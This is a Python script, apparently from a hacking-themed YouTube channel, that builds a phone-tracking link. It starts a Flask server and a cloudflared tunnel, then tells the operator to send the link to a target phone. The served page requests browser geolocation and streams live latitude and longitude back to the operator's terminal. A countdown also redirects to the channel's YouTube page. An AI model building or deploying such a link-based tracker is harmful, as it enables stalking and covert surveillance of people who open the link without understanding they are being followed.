# HCO Find Phone by Azhar - Fully Automatic Termux Version
# Requirements: Termux, Python3, Flask, cloudflared, Termux:API

import os, subprocess, threading, time, re
from flask import Flask, request, render_template_string, jsonify

RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
CLEAR = "\033[2J\033[H"

locations = {}
app = Flask(__name__)

# ---------------- Flask routes -----------------
dashboard_template = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>HCO Find Phone by Azhar</title>
<script>
function sendLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.watchPosition(function(position){
            fetch('/update', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude
                })
            });
        }, function(error){
            alert("Location access denied or unavailable.");
        }, { enableHighAccuracy: true });
    } else {
        alert("Geolocation is not supported by your browser");
    }
}
window.onload = sendLocation;
</script>
<style>
body { background:black; color:red; text-align:center; font-family:Arial; }
h1 { font-size:50px; margin-top:50px; }
p { font-size:25px; color:green; }
</style>
</head>
<body>
<h1>HCO FIND PHONE BY AZHAR</h1>
<p>Your location will be sent automatically to the Termux dashboard.</p>
<p id="status">Waiting for permission...</p>
<script>
navigator.geolocation.getCurrentPosition(function(position){
    document.getElementById('status').innerHTML = 'Location access granted. Sending updates...';
});
</script>
</body>
</html>
"""

@app.route('/')
def dashboard():
    return render_template_string(dashboard_template)

@app.route('/location')
def get_location():
    return jsonify(locations)

@app.route('/update', methods=['POST'])
def update_location():
    data = request.json
    if data and 'lat' in data and 'lon' in data:
        locations['lat'] = data['lat']
        locations['lon'] = data['lon']
        return "OK"
    return "Invalid Data"

def start_server():
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app.run(host='0.0.0.0', port=5000)

# ---------------- Tool lock + countdown + YouTube -----------------
def tool_lock_youtube():
    os.system(CLEAR)
    print(f"{RED}{'='*80}")
    print(f"{RED}{'🔒 TOOL LOCKED 🔒'.center(80)}")
    print(f"{RED}{'Subscribe & click the BELL icon on YouTube 🔔'.center(80)}")
    print(f"{RED}{'='*80}{RED}\n")
    print(f"{CYAN}{'Redirecting in:'.center(80)}{CYAN}\n")
    for i in range(9,0,-1):
        print(f"{CYAN}{str(i).center(80)}")
        time.sleep(1)
    youtube_url="https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
    try:
        subprocess.run(["am","start","-a","android.intent.action.VIEW","-d",youtube_url])
    except:
        print(f"Open YouTube manually: {youtube_url}")
    input("\nPress ENTER after returning from YouTube...")

# ---------------- Start cloudflared tunnel and capture URL automatically -----------------
def start_cloudflared():
    global cloudflare_link
    cloudflare_link = None
    process = subprocess.Popen(["cloudflared","tunnel","--url","http://127.0.0.1:5000"],
                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    # Read output line by line until we find a valid public URL
    while True:
        line = process.stdout.readline()
        if not line:
            break
        if "https://" in line:
            match = re.search(r"(https://[^\s]+\.trycloudflare\.com)", line)
            if match:
                cloudflare_link = match.group(1)
                break
    if not cloudflare_link:
        print("Could not detect Cloudflare URL automatically. Please paste it manually:")
        cloudflare_link = input()

# ---------------- Main -----------------
if __name__=="__main__":
    # Start Flask server
    threading.Thread(target=start_server, daemon=True).start()
    # Start Cloudflare tunnel and capture public URL
    start_cloudflared()
    # Tool lock + countdown + YouTube
    tool_lock_youtube()
    # Dashboard display
    os.system(CLEAR)
    print(f"{RED}{'='*80}")
    print(f"{RED}{'HCO FIND PHONE BY AZHAR'.center(80)}")
    print(f"{RED}{'='*80}{RED}\n")
    print(f"{GREEN}{'Send this link to the phone to track location:'.center(80)}{GREEN}\n")
    print(f"{GREEN}{cloudflare_link.center(80)}{GREEN}\n")
    print(f"{CYAN}{'Waiting for live location updates...'.center(80)}{CYAN}\n")
    # Live location printing in Termux
    while True:
        if locations:
            print(f"{GREEN}LIVE LOCATION → Lat: {locations.get('lat')} , Lon: {locations.get('lon')}{GREEN}")
        time.sleep(3)
